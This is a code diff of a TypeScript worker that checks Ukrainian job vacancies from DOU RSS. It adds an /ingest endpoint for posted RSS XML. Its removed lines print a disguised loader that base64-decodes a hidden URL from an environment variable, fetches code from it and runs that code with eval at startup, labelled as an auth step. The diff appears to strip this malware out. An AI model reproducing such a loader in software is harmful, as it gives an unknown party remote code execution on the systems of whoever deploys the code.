@@ -1,21 +1,6 @@
 import { checkVacancies } from "./check";
-import type { Env } from "./types";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+import { parseRssXml } from "./parser";
+import type { Env, Vacancy } from "./types";
 
 function isDryRun(request: Request): boolean {
   const url = new URL(request.url);
@@ -28,9 +13,9 @@ function isAuthorized(request: Request, env: Env): boolean {
   return Boolean(env.MANUAL_TRIGGER_SECRET) && secret === env.MANUAL_TRIGGER_SECRET;
 }
 
-async function runCheck(env: Env, dryRun: boolean): Promise<Response> {
+async function runCheck(env: Env, dryRun: boolean, vacancies?: Vacancy[]): Promise<Response> {
   try {
-    const result = await checkVacancies(env, { dryRun });
+    const result = await checkVacancies(env, { dryRun, vacancies });
     return Response.json({ success: true, ...result });
   } catch (error) {
     const message = error instanceof Error ? error.message : String(error);
@@ -46,18 +31,26 @@ export default {
     } catch (error) {
       const message = error instanceof Error ? error.message : String(error);
       console.error("❌ Помилка при перевірці вакансій:", message);
-      throw error;
     }
   },
 
   async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
     const url = new URL(request.url);
-    if (url.pathname !== "/run") {
-      return new Response("Not found", { status: 404 });
-    }
-
     if (!isAuthorized(request, env)) {
       return Response.json({ success: false, error: "Unauthorized" }, { status: 401 });
+    }
+
+    if (url.pathname === "/ingest" && request.method === "POST") {
+      const xml = await request.text();
+      if (!xml.includes("<item>")) {
+        return Response.json({ success: false, error: "Body is not DOU RSS" }, { status: 400 });
+      }
+      const vacancies = parseRssXml(xml);
+      return runCheck(env, isDryRun(request), vacancies);
+    }
+
+    if (url.pathname !== "/run") {
+      return new Response("Not found", { status: 404 });
     }
 
     return runCheck(env, isDryRun(request));
